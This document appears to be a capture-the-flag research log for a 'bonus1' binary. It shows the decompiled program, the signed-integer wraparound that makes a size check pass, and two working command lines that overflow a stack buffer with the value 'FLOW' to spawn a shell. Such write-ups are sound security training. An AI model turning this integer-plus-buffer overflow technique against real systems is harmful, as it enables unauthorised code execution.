# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
pwndbg> decomp
    1 int __cdecl main(int argc, const char **argv, const char **envp)
    2 {
    3   _BYTE dest[40]; // [esp+14h] [ebp-2Ch] BYREF
    4   int v5; // [esp+3Ch] [ebp-4h]
    5
 ►  6   v5 = atoi(argv[1]);
    7   if ( v5 > 9 )
    8     return 1;
    9   memcpy(dest, argv[2], 4 * v5);
   10   if ( v5 == 1464814662 )
   11     execl("/bin/sh", "sh", 0);
   12   return 0;
   13 }
```


```bash
# 32-bit two's-complement arithmetic modulo
# https://en.wikipedia.org/wiki/Two%27s_complement

-2147483648 = 0x80000000
0x80000000 * 2 = 0x100000000 # >> 33bits
# 1 00000000 00000000 00000000 00000000
# ^
# bit 32
result => 0x00000000

# Likewise:
-2147483647 = 0x80000001
0x80000001 * 2 = 0x100000002  # >> 33bits
result => 0x00000002

# Hence:
$ bc <<< "obase = 10; ibase=16; (8000000B * 4) % 100000000"
44

gdb-peda$ p/x 1464814662
$6 = 0x574f4c46
gdb-peda$ p (char[4])0x574f4c46
$7 =   "FLOW"
gdb-peda$ p (char[4])1464814662
$8 =   "FLOW"
$ perl -e'print pack("L<", 1464814662)' | xxd
00000000: 464c 4f57                                FLOW
```


```bash
./bonus1 -2147483637 $(printf "%.0s_" {1..40}; perl -e'print pack("L<", 0x574f4c46)')
./bonus1 -2147483637 $(printf "%.0s_" {1..36}; echo OVERFLOW)
```
